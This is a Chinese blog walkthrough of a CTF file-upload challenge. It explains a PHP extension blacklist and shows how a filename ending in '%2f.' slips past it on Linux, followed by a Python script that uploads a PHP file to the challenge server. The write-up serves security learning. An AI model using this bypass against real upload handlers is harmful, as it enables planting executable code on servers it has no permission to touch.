+++
title = '[NSSCTF 2nd]php签到'
date = '2023-09-11T14:02:17+08:00'
categories = ['刷题', '学习', '安全', '比赛']
tags = ['文件上传', '安全']
+++

## 前言

一个简单的文件上传的绕过。

## 解题过程

分析代码：

### pathinfo() 函数：

pathinfo() 函数以数组的形式返回关于文件路径的信息。

pathinfo(path,options)

| 参数 | 描述 |
| --- | --- |
| path | 必需。规定要检查的路径。 |
| options | 可选。规定要返回的数组元素。默认是 all。可能的值：PATHINFO_DIRNAME - 只返回 dirnamePATHINFO_BASENAME - 只返回 basenamePATHINFO_EXTENSION - 只返回 extension(拓展名)PATHINFO_FILENAME - 只返回 filename |

```
 <?php

function waf($filename){
    $black_list = array("ph", "htaccess", "ini");
    $ext = pathinfo($filename, PATHINFO_EXTENSION);//这里只返回扩展名
    foreach ($black_list as $value) {
        if (stristr($ext, $value)){//进行扩展名判断
            return false;
        }
    }
    return true;
}

if(isset($_FILES['file'])){
    $filename = urldecode($_FILES['file']['name']);
    $content = file_get_contents($_FILES['file']['tmp_name']);
    if(waf($filename)){
        file_put_contents($filename, $content);//写入文件
    } else {
        echo "Please re-upload";
    }
} else{
    highlight_file(__FILE__);
}
```

这里我们分析后，发现对上传的文件的后缀进行了过滤，这里使用.绕过，当时在做的时候一直没过去，忽略了windows下是.绕过，而在linux下要用转义符/.进行绕过。

在windows下创建一个1.txt.文件，它会自动转换为1.txt，而在linux下，1.txt.是真实存在的。

![image-20230911194820491](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202309111948551.png)

```
import requests

myurl = 'http://node5.anna.nssctf.cn:28919/'
file_content = "<?php phpinfo();?>'"
file = {'file': ('1.php%2f.', file_content)}
response = requests.post(url=myurl, files=file)
print(response.text)
```

## 结语

系统的特性。简单的文件上传。
